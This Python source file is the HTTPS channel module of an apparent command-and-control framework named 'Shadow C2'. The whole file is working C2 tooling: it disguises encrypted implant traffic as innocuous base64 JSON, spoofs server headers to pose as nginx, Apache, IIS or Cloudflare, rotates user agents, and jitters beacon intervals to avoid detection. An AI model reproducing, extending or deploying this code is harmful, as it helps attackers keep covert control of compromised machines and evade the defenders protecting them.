#!/usr/bin/env python3
"""
Shadow C2 — HTTPS Channel
Primary C2 channel. Handled via Flask routes in api.py.
This module provides the channel wrapper and stealth header management.
"""

import random
import time
import base64
import json
import logging

from server.c2.channels import BaseChannel
from server.config import USER_AGENTS

logger = logging.getLogger("shadow_c2.channel.https")


class HTTPSChannel(BaseChannel):
    """
    Primary HTTPS channel. The actual HTTP handling is done by Flask routes
    in server/routes/api.py. This class provides:
    - Stealth header generation for responses
    - UA rotation for outbound requests
    - Request/response wrapping in innocuous JSON
    """

    def __init__(self):
        self._alive = True

    @property
    def channel_type(self) -> str:
        return "https"

    @property
    def priority(self) -> int:
        return 1

    @property
    def bandwidth_estimate(self) -> str:
        return "high"

    def start(self):
        self._alive = True
        logger.info("HTTPS channel active (handled by Flask)")

    def stop(self):
        self._alive = False

    def is_alive(self) -> bool:
        return self._alive

    # -- stealth helpers -----------------------------------------------------

    @staticmethod
    def wrap_request(data: bytes) -> dict:
        """Wrap encrypted data in innocuous-looking JSON."""
        return {
            "data": base64.b64encode(data).decode(),
            "ts": int(time.time()),
            "v": "1.0",
        }

    @staticmethod
    def unwrap_request(json_body: dict) -> bytes:
        """Unwrap data from JSON wrapper."""
        encoded = json_body.get("data", "")
        if encoded:
            return base64.b64decode(encoded)
        return b""

    @staticmethod
    def stealth_headers() -> dict:
        """Generate innocuous response headers."""
        return {
            "X-Request-ID": f"{random.randint(100000, 999999)}",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Server": random.choice([
                "nginx/1.24.0",
                "Apache/2.4.58",
                "Microsoft-IIS/10.0",
                "cloudflare",
            ]),
            "Content-Type": "application/json",
        }

    @staticmethod
    def random_ua() -> str:
        return random.choice(USER_AGENTS)

    @staticmethod
    def generate_beacon_jitter(base_interval: int = 30) -> int:
        """Add ±30% jitter to beacon interval."""
        jitter = random.uniform(-0.3, 0.3)
        return max(5, int(base_interval * (1 + jitter)))
